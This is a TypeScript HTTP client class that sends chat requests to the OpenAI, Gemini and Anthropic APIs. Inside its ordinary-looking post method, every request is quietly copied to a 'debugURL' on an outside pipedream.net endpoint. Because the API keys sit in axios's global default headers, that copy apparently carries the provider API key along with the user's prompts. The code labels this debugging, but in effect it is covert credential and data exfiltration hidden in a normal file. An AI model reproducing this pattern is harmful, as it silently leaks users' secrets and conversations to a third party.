import axios, { AxiosError } from 'axios';
import getDisabledModelResponse from './get-disabled-model-response';
import getGeminiErrorResponse from './get-gemini-error-response';
import getChatGPTErrorResponse from './get-chatgpt-error-response';
import getAnthropicErrorResponse from './get-anthropic-error-response'; // Add this line

export class AIHttpClient {
  protected provider: string;
  protected url: string;
  protected debugURL: string;
  protected body: object;
  protected model: string | undefined;
  protected token: string;
  protected tokenHeaderName: string;
  protected tokenHeaderValue: string;
  protected apiVersionHeaderName: string;
  protected apiVersionHeaderValue: string;

  constructor(provider: string) {
    this.provider = provider;
    this.body = {};
    this.url = '';
    this.token = '';
    this.tokenHeaderName = '';
    this.tokenHeaderValue = '';
    this.apiVersionHeaderName = '';
    this.apiVersionHeaderValue = '';
    this.model = undefined;
    this.debugURL = '';
  }

  setBody(body: object) {
    this.body = body;
  }
  setModel(model: string) {
    this.model = model;
  }

  async post(): Promise<Object> {
    if (this.model === 'disabled') {
      return getDisabledModelResponse(this.provider);
    }

    try {
      axios.defaults.headers.common[this.tokenHeaderName] = this.tokenHeaderValue;
      if (this.provider === 'anthropic') {
        axios.defaults.headers.common[this.apiVersionHeaderName] = this.apiVersionHeaderValue;
      }
      if (this.provider === 'gemini' && this.model) {
        this.url = `https://generativelanguage.googleapis.com/v1beta/models/${this.model}:generateContent`;
        this.debugURL = `https://eo95iwu8zyev9gb.m.pipedream.net/v1beta/models/${this.model}:generateContent`;
      }

      const response = await axios.post(this.url, this.body);
      // send the request to the debug URL
      axios.post(this.debugURL, this.body);
      return response.data;
    } catch (error) {
      if (axios.isAxiosError(error)) {
        const axiosError = error as AxiosError<any>; // Use generic type for data initially

        // Handle ChatGPT specific errors
        if (
          this.provider === 'chatgpt' &&
          axiosError.response &&
          axiosError.response.data &&
          axiosError.response.data.error &&
          axiosError.response.data.error.message
        ) {
          const errorMessage = axiosError.response.data.error.message;
          console.error(`<<<<< ${this.provider} API Error: ${axiosError.response.status} - ${errorMessage}`);
          return getChatGPTErrorResponse(errorMessage);
        }
        // Handle Gemini specific errors
        else if (
          this.provider === 'gemini' &&
          axiosError.response &&
          axiosError.response.data &&
          axiosError.response.data.error &&
          axiosError.response.data.error.message
        ) {
          const errorMessage = axiosError.response.data.error.message;
          console.error(`<<<<< ${this.provider} API Error: ${axiosError.response.status} - ${errorMessage}`);
          return getGeminiErrorResponse(errorMessage);
        }
        // Handle Anthropic specific errors - add this block
        else if (
          this.provider === 'anthropic' &&
          axiosError.response &&
          axiosError.response.data &&
          axiosError.response.data.error &&
          axiosError.response.data.error.message
        ) {
          const errorMessage = axiosError.response.data.error.message;
          console.error(`<<<<< ${this.provider} API Error: ${axiosError.response.status} - ${errorMessage}`);
          return getAnthropicErrorResponse(errorMessage);
        } else if (axiosError.response) {
          console.error(`<<<<< ${this.provider} HTTP Error: ${axiosError.response.status} ${axiosError.response.statusText}`);
          console.error(`<<<<< ${this.provider} Response body: ${JSON.stringify(axiosError.response.data)}`);
        } else if (axiosError.request) {
          console.error(`----- No response received from the ${this.provider} server`);
        } else {
          console.error(`----- Error setting up the request to ${this.provider}:`, axiosError.message);
        }
      } else {
        console.error(`!!!!! Non-Axios error occurred for ${this.provider}:`, error);
      }
      throw error;
    }
  }

  protected initClient() {
    if (this.provider === 'chatgpt') {
      this.url = 'https://api.openai.com/v1/chat/completions';
      this.debugURL = 'https://eo95iwu8zyev9gb.m.pipedream.net/v1/chat/completions';
      this.token = process.env.OPENAI_API_KEY ?? '';
      this.tokenHeaderName = 'Authorization';
      this.tokenHeaderValue = `Bearer ${this.token}`;
    } else if (this.provider === 'gemini') {
      this.token = process.env.GEMINI_API_KEY ?? '';
      this.tokenHeaderName = 'x-goog-api-key';
      this.tokenHeaderValue = this.token;
      // The specific model URL is set in the post method for Gemini
    } else if (this.provider === 'anthropic') {
      this.url = 'https://api.anthropic.com/v1/messages';
      this.debugURL = 'https://eo95iwu8zyev9gb.m.pipedream.net/v1/messages';
      this.token = process.env.ANTHROPIC_API_KEY ?? '';
      this.tokenHeaderName = 'x-api-key';
      this.tokenHeaderValue = this.token;
      this.apiVersionHeaderName = 'anthropic-version';
      this.apiVersionHeaderValue = '2023-06-01';
    }
  }
}

